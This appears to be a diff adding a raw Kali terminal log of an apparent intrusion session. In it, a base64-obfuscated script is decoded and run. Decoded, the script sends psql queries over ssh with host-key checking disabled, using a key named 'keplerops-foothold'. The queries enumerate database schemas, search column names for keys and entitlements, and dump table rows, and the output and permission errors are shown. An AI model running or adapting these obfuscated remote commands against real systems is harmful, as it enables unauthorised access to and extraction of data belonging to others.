@@ -1,0 +1,92 @@
+└─$ └─$ 
+
+┌──(cinder@kali)-[~]
+└─$ └─$ base64 -d > /tmp/k08db3.sh <<'B64EOF'
+> Y2F0ID4gL3RtcC9yZW1vdGVfazA4X2RiLnNoIDw8J1JFTU9URScKc2V0IC14CnBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgIlxkdCBzdXBwb3J0LioiCnBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgIlxkIHN1cHBvcnQuY3VzdG9tZXJfcmVjb3JkcyIKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAiXGQgc3VwcG9ydC5jdXN0b21lcl9taWdyYXRpb25faGlzdG9yeSIKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAiXGQgZXhwb3J0LnBhcnRpdGlvbl9iaW5kaW5ncyIKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAic2VsZWN0IHRhYmxlX3NjaGVtYSx0YWJsZV9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLnRhYmxlcyB3aGVyZSB0YWJsZV9zY2hlbWEgbm90IGluICgncGdfY2F0YWxvZycsJ2luZm9ybWF0aW9uX3NjaGVtYScpIG9yZGVyIGJ5IDEsMiIKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAic2VsZWN0IHRhYmxlX3NjaGVtYSx0YWJsZV9uYW1lLGNvbHVtbl9uYW1lIGZyb20gaW5mb3JtYXRpb25fc2NoZW1hLmNvbHVtbnMgd2hlcmUgdGFibGVfc2NoZW1hIG5vdCBpbiAoJ3BnX2NhdGFsb2cnLCdpbmZvcm1hdGlvbl9zY2hlbWEnKSBhbmQgKGNvbHVtbl9uYW1lIGlsaWtlICclZW50aXRsZSUnIG9yIGNvbHVtbl9uYW1lIGlsaWtlICclcmVsZWFzZSUnIG9yIGNvbHVtbl9uYW1lIGlsaWtlICclY29udGV4dCUnIG9yIGNvbHVtbl9uYW1lIGlsaWtlICcla2V5JScgb3IgY29sdW1uX25hbWUgaWxpa2UgJyVkZXJpdiUnKSIKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAic2VsZWN0ICogZnJvbSBzdXBwb3J0LmN1c3RvbWVyX3JlY29yZHMgbGltaXQgMjAiCnBzcWwgc2VydmljZT1maWVsZGxpbmsgLWMgInNlbGVjdCAqIGZyb20gc3VwcG9ydC5jdXN0b21lcl9taWdyYXRpb25faGlzdG9yeSBsaW1pdCAyMCIKcHNxbCBzZXJ2aWNlPWZpZWxkbGluayAtYyAic2VsZWN0ICogZnJvbSBleHBvcnQucGFydGl0aW9uX2JpbmRpbmdzIGxpbWl0IDIwIgpSRU1PVEUKY2F0IC90bXAvcmVtb3RlX2swOF9kYi5zaAp0aW1lb3V0IDkwIHNzaCAtbyBTdHJpY3RIb3N0S2V5Q2hlY2tpbmc9bm8gLW8gQ29ubmVjdFRpbWVvdXQ9MTAgLWkgfi8uc3NoL2tlcGxlcm9wcy1mb290aG9sZCAtcCAyMjIyIHJvd2FuQHJvd2FuLWRldiAnYmFzaCAtcycgPCAvdG1wL3JlbW90ZV9rMDhfZGIuc2gK
+> B64EOF
+
+┌──(cinder@kali)-[~]
+└─$ └─$ chmod +x /tmp/k08db3.sh; bash /tmp/k08db3.sh; echo DONEMARK_1795208597790$((6*7))
+set -x
+psql service=fieldlink -c "\dt support.*"
+psql service=fieldlink -c "\d support.customer_records"
+psql service=fieldlink -c "\d support.customer_migration_history"
+psql service=fieldlink -c "\d export.partition_bindings"
+psql service=fieldlink -c "select table_schema,table_name from information_schema.tables where table_schema not in ('pg_catalog','information_schema') order by 1,2"
+psql service=fieldlink -c "select table_schema,table_name,column_name from information_schema.columns where table_schema not in ('pg_catalog','information_schema') and (column_name ilike '%entitle%' or column_name ilike '%release%' or column_name ilike '%context%' or column_name ilike '%key%' or column_name ilike '%deriv%')"
+psql service=fieldlink -c "select * from support.customer_records limit 20"
+psql service=fieldlink -c "select * from support.customer_migration_history limit 20"
+psql service=fieldlink -c "select * from export.partition_bindings limit 20"
++ psql service=fieldlink -c '\dt support.*'
+                          List of relations
+ Schema  |            Name            | Type  |        Owner         
+---------+----------------------------+-------+----------------------
+ support | customer_migration_history | table | fieldlink_data_owner
+ support | customer_records           | table | fieldlink_admin
+(2 rows)
+
++ psql service=fieldlink -c '\d support.customer_records'
+                        Table "support.customer_records"
+       Column       |           Type           | Collation | Nullable | Default 
+--------------------+--------------------------+-----------+----------+---------
+ record_id          | text                     |           | not null | 
+ tenant             | text                     |           | not null | 
+ connector_revision | text                     |           | not null | 
+ asset              | text                     |           | not null | 
+ case_ref           | text                     |           | not null | 
+ created_at         | timestamp with time zone |           |          | now()
+Indexes:
+    "customer_records_pkey" PRIMARY KEY, btree (record_id)
+
++ psql service=fieldlink -c '\d support.customer_migration_history'
+        Table "support.customer_migration_history"
+      Column      | Type | Collation | Nullable | Default 
+------------------+------+-----------+----------+---------
+ former_name      | text |           | not null | 
+ former_tenant    | text |           | not null | 
+ former_revision  | text |           | not null | 
+ current_tenant   | text |           | not null | 
+ current_revision | text |           | not null | 
+ effective_date   | date |           | not null | 
+Indexes:
+    "customer_migration_history_pkey" PRIMARY KEY, btree (former_name)
+
++ psql service=fieldlink -c '\d export.partition_bindings'
+               Table "export.partition_bindings"
+       Column       |  Type   | Collation | Nullable | Default 
+--------------------+---------+-----------+----------+---------
+ export_id          | text    |           | not null | 
+ tenant             | text    |           | not null | 
+ partition_id       | text    |           | not null | 
+ connector_revision | text    |           | not null | 
+ revision           | integer |           | not null | 
+ is_current         | boolean |           | not null | true
+Indexes:
+    "partition_bindings_pkey" PRIMARY KEY, btree (export_id, tenant, partition_id)
+
++ psql service=fieldlink -c 'select table_schema,table_name from information_schema.tables where table_schema not in ('\''pg_catalog'\'','\''information_schema'\'') order by 1,2'
+ table_schema |     table_name     
+--------------+--------------------
+ export       | partition_bindings
+(1 row)
+
++ psql service=fieldlink -c 'select table_schema,table_name,column_name from information_schema.columns where table_schema not in ('\''pg_catalog'\'','\''information_schema'\'') and (column_name ilike '\''%entitle%'\'' or column_name ilike '\''%release%'\'' or column_name ilike '\''%context%'\'' or column_name ilike '\''%key%'\'' or column_name ilike '\''%deriv%'\'')'
+ table_schema | table_name | column_name 
+--------------+------------+-------------
+(0 rows)
+
++ psql service=fieldlink -c 'select * from support.customer_records limit 20'
+ERROR:  permission denied for schema support
+LINE 1: select * from support.customer_records limit 20
+                      ^
++ psql service=fieldlink -c 'select * from support.customer_migration_history limit 20'
+ERROR:  permission denied for schema support
+LINE 1: select * from support.customer_migration_history limit 20
+                      ^
++ psql service=fieldlink -c 'select * from export.partition_bindings limit 20'
+ export_id |    tenant     | partition_id | connector_revision | revision | is_current 
+-----------+---------------+--------------+--------------------+----------+------------
+ EXP-2841  | TEN-ARWC-019  | PART-ARWC-01 | FLK-7.4.2          |        6 | t
+ EXP-2841  | TEN-OTHER-001 | PART-ARWC-02 | FLK-7.3.1          |        5 | f
+(2 rows)
+
